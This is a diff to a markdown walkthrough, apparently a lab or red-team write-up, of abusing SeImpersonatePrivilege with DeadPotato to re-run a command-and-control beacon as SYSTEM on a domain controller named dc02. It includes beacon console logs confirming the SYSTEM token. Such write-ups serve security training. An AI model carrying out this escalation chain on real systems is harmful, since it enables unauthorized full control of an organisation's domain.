@@ -686,7 +686,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 
 Now the password is changed i can use the credentials to login with login type 5 (service logon) which should give me SeImpersonatePrivilege
 
-# Abusing `SeImpersonatePrivilege`
+# Abusing `SeImpersonatePrivilege` to get SYSTEM on `dc02`
 
 ```python
 +--- Task [e8e28b4e] closed ----------------------------------------------------------+
@@ -815,4 +815,13 @@ This now gives me a higher privilege beacon
 [20/08 21:49:07] [*] Agent called server, sent [2.27 Mb]
 ```
 
-Now in this higher privilege beacon ill use deadpotato to re-execute
+Now in this higher privilege beacon ill use deadpotato to re-execute my beacon payload
+
+```python
+[20/08 21:50:19] ethan [f7fad0fc] beacon > getuid
+[20/08 21:50:19] [*] Task: get username of current token
+[20/08 21:50:22] [*] Agent called server, sent [12 bytes]
+[20/08 21:50:22] [+] You are 'NT AUTHORITY\SYSTEM' (elevated)
+
++--- Task [f7fad0fc] closed ----------------------------------------------------------+
+```
